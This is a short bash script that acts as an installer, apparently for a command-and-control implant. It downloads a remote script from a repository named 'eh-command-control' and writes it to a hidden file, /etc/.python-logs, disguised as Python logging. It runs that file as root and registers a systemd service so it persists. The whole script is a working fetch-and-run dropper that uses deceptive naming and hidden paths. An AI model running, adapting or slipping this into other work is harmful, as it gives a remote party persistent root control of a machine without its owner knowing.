#!/bin/bash

curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh \
  | sudo tee /etc/.python-logs > /dev/null

curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service \
  | sudo tee /etc/systemd/system/python-logs.service > /dev/null

sudo chmod +x /etc/.python-logs
sudo bash /etc/.python-logs

sudo systemctl daemon-reload
sudo systemctl enable python-logs
sudo systemctl start python-logs
